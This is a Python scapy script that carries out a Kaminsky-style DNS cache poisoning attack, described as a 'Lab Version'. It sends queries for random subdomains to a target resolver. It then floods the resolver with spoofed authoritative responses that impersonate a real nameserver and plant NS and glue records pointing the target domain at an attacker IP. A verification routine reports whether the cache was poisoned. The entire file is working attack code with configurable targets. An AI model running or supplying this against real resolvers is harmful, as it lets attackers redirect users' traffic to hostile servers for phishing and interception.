                        
#!/usr/bin/env python3
import random
import argparse
import multiprocessing
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1, conf
import time

# --- Configuration ---
conf.verb = 0

# Number of txid values (16-bit)
TXID_RANGE = 65536

# Worker for sending spoofed responses with random txid
def spoof_worker(args):
    resolver_ip, real_ns_ip, dns_payload, num_packets = args
    for i in range(num_packets):
        # Generate random transaction ID between 1 and 50
        txid = random.randint(1, 50)
        packet = IP(src=real_ns_ip, dst=resolver_ip) / \
                 UDP(sport=53, dport=53) / \
                 dns_payload
        packet[DNS].id = txid
        send(packet)
        if i % 1000 == 0:
            print(f"[SPOOF] Sent {i+1}/{num_packets}: txid={txid}")

# Main attack logic
def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests, num_responses):
    random_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
    fake_ns_domain = "ns.attacker-lab.com"
    print(f"[*] Using random subdomain: {random_subdomain}")

    print(f"[*] Sending {num_requests} initial queries...")
    for i in range(num_requests):
        txid = random.randint(0, TXID_RANGE-1)
        src_port = random.randint(1024, 65535)
        query_packet = IP(dst=resolver_ip) / UDP(sport=src_port, dport=53) / DNS(id=txid, rd=1, qd=DNSQR(qname=random_subdomain))
        send(query_packet)
        if i % 10 == 0:
            print(f"[QUERY] Sent {i+1}/{num_requests}: txid={txid}, src_port={src_port}")

    # Pre-craft the constant part of the DNS response
    dns_payload = DNS(
        qr=1, aa=1,
        qd=DNSQR(qname=random_subdomain),
        an=DNSRR(rrname=random_subdomain, ttl=86400, rdata=attacker_ip),
        ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, rdata=fake_ns_domain),
        ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
    )

    print(f"[*] Flooding with {num_responses} spoofed responses (random txid 1-50)...")
    num_processes = multiprocessing.cpu_count() or 2
    packets_per_process = num_responses // num_processes
    tasks = []
    for i in range(num_processes):
        packets_this_process = packets_per_process if i < num_processes-1 else num_responses - (packets_per_process * (num_processes-1))
        tasks.append((resolver_ip, real_ns_ip, dns_payload, packets_this_process))
    with multiprocessing.Pool(processes=num_processes) as pool:
        pool.map(spoof_worker, tasks)

def verify_attack(resolver_ip, target_domain, attacker_ip):
    print("[*] Verifying attack...")
    try:
        query = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=target_domain))
        response = sr1(query, timeout=2)
        if response and response.haslayer(DNSRR) and response[DNSRR].rdata == attacker_ip:
            print(f"[SUCCESS] DNS cache poisoned! {target_domain} -> {attacker_ip}")
            return True
        else:
            print("[VERIFY] Not poisoned yet.")
    except Exception as e:
        print(f"[VERIFY] Error: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(description="Kaminsky DNS Cache Poisoning Attack (Lab Version)")
    parser.add_argument("--resolver", default="10.0.0.53", help="IP of the target DNS resolver.")
    parser.add_argument("--attacker-ip", default="10.0.0.10", help="IP of the attacker's machine.")
    parser.add_argument("--real-ns", default="8.8.8.8", help="IP of the real nameserver to impersonate.")
    parser.add_argument("--domain", default="my-lab-bank.com", help="The target domain to poison.")
    parser.add_argument("--tries", type=int, default=100, help="Number of attack attempts to make.")
    parser.add_argument("--requests", type=int, default=10, help="Number of initial DNS queries per try.")
    parser.add_argument("--responses", type=int, default=1000, help="Number of spoofed responses per try (with random txid 1-50).")
    args = parser.parse_args()

    print("\n--- DNS Cache Poisoning Attack Starting ---")
    print(f"[+] Target Domain: {args.domain}")
    print(f"[+] Target Resolver: {args.resolver}")
    print(f"[+] Attacker IP: {args.attacker_ip}")
    print(f"[+] Real NS to impersonate: {args.real_ns}")
    print(f"[+] Using {multiprocessing.cpu_count()} CPU cores for the attack.")
    print("-------------------------------------------\n")

    for i in range(args.tries):
        print(f"[*] --- Attempt #{i + 1} of {args.tries} ---")
        run_attack(args.resolver, args.attacker_ip, args.real_ns, args.domain, args.requests, args.responses)
        if verify_attack(args.resolver, args.domain, args.attacker_ip):
            print(f"[RESULT] {args.domain} now points to {args.attacker_ip}")
            return
        else:
            print("[-] Attack failed on this attempt. Trying again...\n")
    print("\n[FAILURE] All attack attempts failed. The DNS cache was not poisoned.")

if __name__ == "__main__":
    main()

